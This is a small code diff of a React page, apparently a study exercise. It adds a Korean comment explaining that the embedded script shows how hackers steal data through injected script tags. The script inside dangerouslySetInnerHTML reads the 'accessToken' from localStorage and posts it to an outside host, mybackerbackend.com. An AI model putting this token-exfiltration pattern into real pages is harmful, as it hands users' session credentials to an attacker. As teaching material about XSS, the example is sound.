@@ -31,7 +31,7 @@ export default function StaticRoutingMovedPage(): JSX.Element {
           __html: `
               <script>
                 const qqq = localStorage.getItem("accessToken")
-                axios.post("http://mybackerbackend.com/mydata", {data: qqq})
+                axios.post("http://mybackerbackend.com/mydata", {data: qqq}) 이거는 해커가 해킹하는 방식임!! 요 안에 스크립트 태그를 넣어서 자바스크립트로 토큰 값 가져오고 등등 해킹함!! 
               </script>
           `,
         }}
